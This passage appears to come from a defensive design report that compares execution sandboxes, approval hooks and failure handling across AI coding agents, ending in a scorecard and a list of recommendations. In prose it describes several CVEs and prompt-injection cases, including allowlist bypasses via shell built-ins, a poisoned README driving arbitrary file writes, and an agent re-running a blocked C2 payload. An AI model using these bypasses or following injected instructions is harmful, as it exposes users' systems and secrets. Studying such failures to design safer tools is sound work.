*Correction to the brief:* the `--yes-always` auto-run escape **does not exist** —
`io.py:866` returns `"n"` when `explicit_yes_required`, so blanket-yes inverts to no for exec.
That hole is closed by design; the holes are elsewhere. **CVE-2026-85674** (7.8, **open,
unfixed**): a repo-root `.aider.conf.yml` sets `test-cmd`, run at startup through `shell=True`
with no confirmation, no LLM, no API key — `git clone` + `aider` = RCE. The well-built
confirmation was simply not on the path the code took.
**One thing worth stealing:** `repomap.py` is the only disciplined ordering in the family —
PageRank over a symbol graph, then
`sorted(ranked_definitions.items(), reverse=True, key=lambda x: (x[1], x[0]))` (`:548`) with
`(fname, ident)` as an explicit deterministic tie-break, budget by binary search over prefixes
of the rank-ordered list, then `to_tree` **re-sorts alphabetically for rendering** (`:759`) —
truncation by rank, presentation by name, deliberately split. And the counter-example on the
same page: `/run` output has **no truncation whatsoever**.

**Cursor (closed source) — three layers, and one correction to our framing.**
Hooks (`~/.cursor/hooks.json`, shipped 1.7): `preToolUse` *"fires for all tool types (Shell,
Read, Write, MCP, Task, etc.)"* and returns allow/deny **and `updated_input`** — a rewrite, not
just a veto; `beforeShellExecution`, `beforeMCPExecution`, `beforeReadFile`, `beforeTabFileRead`
also exist and gate. **So Cursor is not a pure half-seam at the hook layer, and the ADR must
scope the claim to Cursor's default posture and `.cursorignore`, or a reviewer who knows
<https://cursor.com/docs/hooks> will discount it.** Likewise **do not say "Cursor does not
sandbox by default"** — a terminal sandbox (macOS/Linux) is on by default under Auto-review,
`networkPolicy.default: "deny"`, with `.cursor/*.json`, `.git/hooks/**`, `.git/config`,
`.vscode/**` always write-protected. What *is* documented asymmetry: *"Reading files and
searching code don't require approval"*, and *"The terminal and MCP server tools used by Agent
cannot block access to code governed by `.cursorignore`"* — with reported bypasses via
`cat`/`ls`, the git object store, and open editor tabs, plus **CVE-2025-64110** (the agent
writing its own `.cursorignore`). The **unit is a raw command string**, and it bled: four
independent denylist bypasses (Backslash) answered by **deprecating the denylist in 1.3**;
then the allowlist leaked via backticks/`$()` (**CVE-2025-54131**), brace expansion, and
**shell built-ins** (`export`, `unset`, `set` — not separate binaries, never validated, so
injected env state hijacks a *later allowlisted* command: **CVE-2026-22708, CVSS 9.8,
five-month fix**). Also **CVE-2025-54136 "MCPoison"** — approval binds to the MCP server
*name*, so swapping the config after approval never re-prompts: **a gate bound to identity
rather than content.** Failure taxonomy exists but partitions wrongly:
`postToolUseFailure.failure_type` is `error | timeout | permission_denied`, a non-zero exit is
not a failure event at all, and **sandbox-startup failure collapses into `error`.**
**Self-Hosted Machines** is the real seam: agent loop in Cursor's cloud, `agent worker start`
opens a long-lived outbound HTTPS connection, *"that machine holds the working copy of the
repository, edits files, and runs commands."*

**Windsurf/Cascade (closed source) — no embedder seam, and the best single citation for
"a half-seam reads as safe."** Four auto-execution levels (Disabled / Allowlist Only / Auto /
Turbo); allow/deny lists are **prefix matching on a raw shell line** and apply **exclusively to
terminal commands**. **CVE-2025-62353** (CVSS 9.8, HiddenLayer, all versions ≤1.12.12): path
traversal in `codebase_search` and `write_to_file` — arbitrary read **and write** anywhere on
the filesystem, reachable by indirect prompt injection from a poisoned `README.md`, **effective
with Auto Execution OFF and `write_to_file` explicitly on the deny list.** The user had taken
every deliberate step the product offers, and none of them was on the path the tool took.
Also **CVE-2026-30615** (CVSS 8): attacker-controlled HTML modifies the local MCP config and
auto-registers a malicious stdio server → zero-click arbitrary command execution.

**Devin (closed source) — the commercial validation that the seam is whole-surface.**
**Outposts** (~Jul 2026): *"Devin's agent loop (inference and planning) continues to run in
Devin's cloud, while all command execution, file edits, and repository access happen on
machines you operate"* — *"every command, file edit, and repository operation runs on your
machine."* The proof it is whole-surface is the **host requirements**: Chrome/Chromium,
ffmpeg, Git and a display/graphics stack — the editor and the browser are inside the boundary
too. Tool-call-level interposition: **none / not public**; no hook API, no pluggable executor,
no published message schema. Ordering/truncation: **nothing public, do not cite Devin here.**
Failure taxonomy is weak — `status_enum` = `working, blocked, expired, finished,
suspend_requested, …` with **no `failed`/`error` member**; infrastructure failure only became a
first-class product concept in Sept 2026, as UI affordances. **The one piece worth stealing:**
the Devin CLI sandbox — *"If sandbox resolution fails… the CLI will refuse to start rather than
running unsandboxed"*, so security intent is not *"silently bypassed."* **Fail-closed on
seam-unavailable, explicitly distinguished from ordinary execution.** Honest counterweight:
even with Outposts, the prompt and the plan leave the perimeter — containment of *tools* is not
containment of the *conversation*. Johann Rehberger (Apr 2025) drove arbitrary execution by
indirect injection from a GitHub issue; Devin downloaded a C2 payload and **chmod'd it when the
first attempt was blocked**; *"any secret on a Devin box can be compromised by an adversary via
a prompt injection attack."* Vendor acknowledged, then went silent 120+ days.

---

## 8. Scorecard

| | seam exists | unit | file tools in seam | sort before truncate | kind 1 ≠ kind 2 | default isolation |
|---|---|---|---|---|---|---|
| Claude Code | name-remap + deny/rewrite | whole tool call | **NO — documented** | **no (mtime)** | yes (+ fail-open default) | opt-in seatbelt/bwrap, shell only |
| Codex CLI | 2 internal traits, no public API | cmd string + structured fs ops | **YES** | **YES** (`entries.sort()` → cap → `truncated`) | new path yes, old path greps stderr | on by default, seatbelt / bwrap+seccomp |
| opencode | **none** (`Promise<void>`) | whole tool call, shell string | no — 3 separate paths | no (stream head; flag discarded) | **no** | **none** |
| Goose | `McpClientTrait` swap | whole MCP call | **partial** — `tree`/`read_image` fall through | n/a (no glob/grep) | in payload, lost across ACP | **none** (`--container` can't reach them) |
| Cline | `ToolExecutors` (**undocumented**) | typed per-tool ops | **YES except listFiles** | no (Set/BFS mid-traversal) | **YES** (`CommandExitError`) | **none** |
| Continue | `IDE` interface | mixed | files yes, **shell bypasses locally** | no (host picks the 100) | prose only; void across seam | **none** |
| Aider | **none** (no tool architecture) | interactive shell string | n/a — bare `open()` | repomap yes, `/run` no cap | **no**, exit code never shown | **none** |
| Cursor | hooks (all tool types) + self-hosted machines | **raw command string** | hooks yes; defaults no | **not public** | `error\|timeout\|permission_denied`, startup collapses | terminal sandbox **on** by default |
| Windsurf | **none** | command-string prefix | **no** (CVE-2025-62353) | not public | not documented | **none** |
| Devin | Outposts, process-level | not public | **YES** (whole surface) | not public | **no** (`status_enum` has no failure) | per-session VM; CLI unsandboxed by default |

---

## 9. What toolnexus should copy, avoid, and claim

### Copy

1. **Peer seams for exec and filesystem, with the sandbox context as an argument.** Codex's
   `ExecBackend` + `ExecutorFileSystem`, each with local / sandboxed / remote implementations,
   `sandbox: Option<&FileSystemSandboxContext>` on **every** file method. This is the design
   the strongest implementation in the family arrived at independently.
2. **Typed per-tool ops, not a generic opaque call.** Cline's `ToolExecutors` — `FileReadExecutor`,
   `SearchExecutor`, `EditorExecutor`, `ApplyPatchExecutor`, `ShellExecutor` — proved in
   production by Cline's own VS Code app swapping four of the five. Goose's single
   `call_tool(name, JsonObject)` forces every decorator to re-implement every schema.
3. **A typed failure taxonomy, not an exit code and not a string.** Cline's `CommandExitError
   (exitCode, output)` vs a spawn `Error` vs `TimeoutError`; Codex's
   `Exited { exit_code, sandbox_denied: Option<bool> }`. Our three kinds map onto these
   directly.
4. **Fail closed when the seam is unavailable, and say so.** Devin's CLI: *"refuse to start
   rather than running unsandboxed."* Claude Code's `failIfUnavailable: false` and opencode's
   third-party wrapper (*"if anything goes wrong… commands run normally"*) are the inverse, and
   both are fail-open.
5. **Truncation notices the model can act on, placed so re-truncation cannot eat them.** Cline's
   middle-elision with the notice in the preserved head/tail, and the reason: output is re-sent
   every turn, so oversized output costs quadratically. Goose puts the notice in a **separate
   content block** so it reads as instruction, not data. Continue names *which* limit bit.
6. **Aider's `(rank, identity)` tie-break** and its split between "truncate by rank, present by
   name" — if `read`'s offset/limit or the `<skill_files>` sample ever needs a non-lexical
   ranking, that is the shape, and the tie-break must be explicit.

### Avoid

1. **Mutation hooks (`Promise<void>`, mutate-args-in-place).** opencode #42409 — mutating
   `args.command` in `tool.execute.before` is visible to later hooks **but the original command
   still runs**; #35882 — permissions evaluated *after* mutation, so an allowlist is satisfied
   by a rewritten string. A seam that **returns a result** has neither bug. Claude Code's
   `canUseTool`/`PreToolUse` and Cursor's `beforeShellExecution` are the same shape.
2. **A command string as the unit of trust.** Cursor deprecated an entire denylist rather than
   patch four bypasses, then leaked again through backticks, brace expansion and shell
   built-ins at CVSS 9.8; opencode tried tree-sitter, kept leaking, then dropped the parser;
   Continue shipped a whole `@continuedev/terminal-security` package to compensate. Our design
   already refuses to interpret the command — **keep it that way and say in the ADR that
   *interpreting* the string is the failure mode, not passing it.**
3. **Letting the sandbox pick which N results come back.** Continue passes the cap *into* the
   IDE (`getSearchResults(query, 100)`), opencode truncates at the ripgrep stream head and
   **discards the `truncated` flag**, Cline caps an insertion-ordered `Set` mid-BFS and can
   return partial results on a 10s timeout with only a `Logger.warn`. Every one of these makes
   the same call return different rows depending on where it ran. This is the exact divergence
   A25/A26 measured in clojure's two hosts.
4. **Any trust signal the model writes.** Cline CVE-2026-52024 (`requires_approval` on the
   model's own tool call) and Goose `SmartApprove` (self-declared `read_only_hint`) are the
   same defect in two products. Codex GHSA-w5fx-fh39-j5rw is the third: **the model named the
   sandbox's writable root.** Whatever carries the seam's boundary must be host-supplied and
   canonicalized.
5. **Deriving permissions from the operation's own paths.** Codex "Overpatch": `apply_patch`
   granted write to the parent directory of each path in the patch, so a `/tmp` mention
   widened the grant to `/`. Our `apply_patch` routes through the seam — it must not also
   compute a policy from the patch body.
6. **Letting any internal caller route around the seam.** Anthropic documents that `toolAliases`
   misses *"harness-internal direct calls that hold the tool object without a name lookup"*.
   Goose's CVE-2026-72718 is the extreme version: `git diff HEAD` ran an attacker's
   `core.fsmonitor` command **before any tool call existed**, so the permission model was never
   consulted. **If `BuiltinExec` is set, there must be no second code path to `exec.Command` or
   `os.ReadFile` in any of the seven ports — and that is a testable invariant, not a
   convention.**
7. **Exposing the seam over HTTP without treating its auth as the security boundary.**
   opencode's two CVEs (CVE-2026-22812, CVE-2026-22813) are both about the server in front of
   the tools, not the tools.

### What nobody in this family has solved

1. **Deterministic capped listings across an execution boundary.** Codex's `walk()`
   (sort → cap → `truncated`) is the only correct implementation found, and it is a *local*
   filesystem walk, never tested for byte-identity between a local and a remote implementation.
   Nobody guarantees that `glob`/`grep` return the same rows whether they ran on the host or in
   a container. **This is our spike #1, and no one else has run it.** It is also the strongest
   support for the two-shape decision: Codex sorts library-side *because* it also owns the
   remote implementation; we do not own the sandbox image, so the sort has to be on our side of
   the wire or it is nothing.
2. **Parity between the native and the interposed implementation.** Goose is the proof that
   this is a real hazard: `ShellOutput` separates spawn failure from non-zero exit natively,
   and the ACP-interposed path rebuilds from exit status only, turning `None` into `0` via
   `unwrap_or_default()`. **No product in this family has a test or a type that forces an
   interposed executor to reproduce the native one's behaviour.** Our conformance suite already
   does this across seven languages; running the same goldens through the seam (spike #2) is a
   capability nobody else has the machinery for.
3. **A failure taxonomy that separates "the environment could not run it" from "it ran and
   exited non-zero", exposed to the host.** Cline has it in-process. Codex has it in its new
   event and concedes the old path greps stderr for the word "sandbox". Cursor collapses
   sandbox-startup into `error`. Continue loses everything across `Promise<void>`. Aider never
   shows the model the exit code. Devin's `status_enum` has no failure member. **wfnexus's
   three-kind requirement is unmet by the entire family.**
4. **The listing tool is always the one left outside.** Cline: full seam except `listFiles`.
   Goose: full ACP interception except `tree`. Continue: security checks on read/write but not
   on `grep`/`glob`/`ls`. opencode: `realPath` containment on read/edit, bare `path.resolve` on
   glob/grep. Four independent products, same omission. **Design the seam so the listing tools
   are the ones that cannot be forgotten** — which is what the two-shape split does by giving
   them their own contract instead of leaving them as "not really execution".

### Nothing contradicts the agreed design

No tool in this family deliberately makes listing opaque to the sandbox. The only argument a
reviewer could import for one uniform shape is Codex's, and Codex sorts **library-side** in
`local_file_system.rs` — it owns both ends of its own wire, which we do not. The half-seam
claim is not a design opinion: it is Claude Code's shipped architecture, documented in one
sentence, and it produced CVE-2026-39861 by exactly the mechanism the design doc predicted.

---

## Sources

Claude Code: [sandboxing docs](https://code.claude.com/docs/en/sandboxing) ·
[advisories](https://github.com/anthropics/claude-code/security/advisories) ·
[GHSA-vp62-r36r-9xqp](https://github.com/anthropics/claude-code/security/advisories/GHSA-vp62-r36r-9xqp) ·
[GHSA-66q4-vfjg-2qhh](https://github.com/anthropics/claude-code/security/advisories/GHSA-66q4-vfjg-2qhh) ·
`@anthropic-ai/claude-agent-sdk` `sdk.d.ts` / `sdk-tools.d.ts`.
Codex: [approvals & security](https://learn.chatgpt.com/docs/agent-approvals-security) ·
[GHSA-w5fx-fh39-j5rw](https://github.com/openai/codex/security/advisories/GHSA-w5fx-fh39-j5rw) ·
[Accomplish: escaping the Codex sandbox, twice](https://www.accomplish.ai/blog/escaping-the-openai-codex-sandbox-twice/) ·
[Pillar: GitPwned](https://www.pillar.security/blog/gitpwned-allowlist-to-rce) ·
`openai/codex` @ `142360dac8ea`.
opencode: [repo](https://github.com/anomalyco/opencode) ·
[permissions docs](https://opencode.ai/docs/permissions/) ·
[GHSA-c83v-7274-4vgp](https://github.com/anomalyco/opencode/security/advisories/GHSA-c83v-7274-4vgp).
Goose: [repo](https://github.com/block/goose) ·
[developer extension](https://block.github.io/goose/docs/mcp/developer-mcp) ·
[permissions](https://block.github.io/goose/docs/guides/managing-tools/goose-permissions) ·
[GHSA-r5pp-p5r8-466r](https://github.com/block/goose/security/advisories/GHSA-r5pp-p5r8-466r).
Cline: [repo](https://github.com/cline/cline) ·
[auto-approve docs](https://docs.cline.bot/features/auto-approve) ·
[Manifold: CVE-2026-52024/52025](https://www.manifold.security/blog/cline-code-execution-bypass) ·
[Mindgard](https://mindgard.ai/blog/cline-coding-agent-vulnerabilities).
Continue: [repo](https://github.com/continuedev/continue) ·
[tool permissions](https://docs.continue.dev/cli/tool-permissions) ·
[issue #8877](https://github.com/continuedev/continue/issues/8877).
Aider: [repo](https://github.com/Aider-AI/aider) ·
[CVE-2026-85674](https://nvd.nist.gov/vuln/detail/CVE-2026-85674) ·
[issue #5254](https://github.com/Aider-AI/aider/issues/5254).
Cursor: [agent security](https://cursor.com/docs/agent/security) ·
[hooks](https://cursor.com/docs/hooks) · [ignore files](https://cursor.com/docs/context/ignore-files) ·
[self-hosted machines](https://cursor.com/blog/self-hosted-machines) ·
[Backslash: denylist bypass](https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist) ·
[Pillar: trusted commands as attack vectors](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors).
Windsurf: [terminal docs](https://docs.devin.ai/desktop/terminal) ·
[CVE-2025-62353](https://nvd.nist.gov/vuln/detail/CVE-2025-62353) ·
[HiddenLayer writeup](https://witness.ai/blog/windsurf-security/) ·
[GHSA-wj2m-jvpr-64cq](https://github.com/advisories/GHSA-wj2m-jvpr-64cq).
Devin: [Outposts](https://docs.devin.ai/cloud/outposts/overview) ·
[security](https://docs.devin.ai/admin/security) ·
[Rehberger: $500 to hack Devin](https://embracethered.com/blog/posts/2025/devin-i-spent-usd500-to-hack-devin/).
Cross-vendor: [BleepingComputer: week of sandbox escapes](https://www.bleepingcomputer.com/news/security/cursor-codex-gemini-cli-antigravity-hit-by-sandbox-escapes/).
